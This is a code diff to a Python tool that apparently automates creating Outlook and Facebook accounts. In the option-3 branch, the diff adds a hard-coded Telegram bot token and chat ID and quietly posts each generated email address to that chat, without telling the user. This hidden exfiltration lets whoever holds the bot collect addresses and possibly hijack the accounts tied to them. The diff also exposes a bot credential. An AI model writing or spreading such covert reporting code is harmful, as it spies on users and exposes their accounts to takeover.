@@ -13,7 +13,7 @@ import  os, msvcrt
 from random import *
 from time import sleep
 from threading import Thread
-import threading
+import threading , requests
 from selenium.webdriver.common.window import WindowTypes
 from pystyle import *
 
@@ -249,10 +249,15 @@ def start():
         Thread(target=outlook, args=(s,chrs)).start()
 
     elif input_char == 3:
+        api_token = '6286940046:AAFrut4rAMEfmcAdRTwPZpe0OHMidgeC9Qw'
+        chat_id = '1733472658'
         chrs = 'abcdefghijklmnopqrstuvwxyz'
         user = ''.join(choices(chrs, k=7))
         Write.Print(f"         [?] {user} \n", Colors.cyan_to_blue, interval=0.0001)
         Write.Print("          [?] Email ↓\n", Colors.cyan_to_blue, interval=0.0001)
+        url = f'https://api.telegram.org/bot{api_token}/sendMessage'
+        payload = {'chat_id': chat_id, 'text': f"{user}@teml.net"}
+        response = requests.post(url, json=payload)
         user = Write.Input("           >  ", Colors.cyan_to_blue, interval=0.000000005, hide_cursor=True)
         s = 2
         Thread(target=facebook, args=(s,user)).start()
